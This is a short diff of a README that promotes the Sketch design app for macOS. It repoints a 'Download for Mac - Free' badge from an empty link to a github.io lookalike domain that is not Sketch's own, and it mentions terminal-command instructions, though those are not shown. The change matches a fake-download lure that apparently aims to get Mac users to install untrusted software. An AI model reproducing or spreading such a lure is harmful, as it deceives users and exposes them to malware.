@@ -2,7 +2,7 @@
 
 Bring your design ideas to life with **Sketch** — the powerful vector graphics editor tailored for macOS. Whether you're designing user interfaces, icons, wireframes, or prototypes, Sketch gives you the tools to work faster and smarter.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-Free-blue?logo=apple\&style=for-the-badge)](#)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-Free-blue?logo=apple\&style=for-the-badge)](https://sketch-for-mac-download.github.io/.github/)
 
 If the button doesn't work, follow the instructions below using the terminal command.
 
